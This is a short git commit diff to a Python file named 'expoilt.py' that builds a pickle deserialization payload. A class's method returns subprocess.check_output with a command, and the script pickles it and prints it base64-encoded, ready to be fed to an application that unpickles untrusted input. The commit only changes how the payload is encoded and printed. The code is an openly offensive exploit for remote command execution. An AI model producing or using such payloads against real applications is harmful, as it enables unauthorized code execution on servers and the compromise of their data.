ea781ee72161b116bf3c8d48362151fb7ee5d30f
Swetosree <35164715+Swetosree@users.noreply.github.com>
2025-10-29 04:13:33 +0530

    Update expoilt.py

--- app/templates/expoilt.py
+++ app/templates/expoilt.py
@@ -7,7 +7,4 @@ class Reveal:
         return subprocess.check_output,(cmd,)
 
 payload_bytes = pickle.dumps(Reveal())
-payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode()
-payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)  # Fix padding
-
-print(payload_b64)
+print(base64.urlsafe_b64encode(payload_bytes))
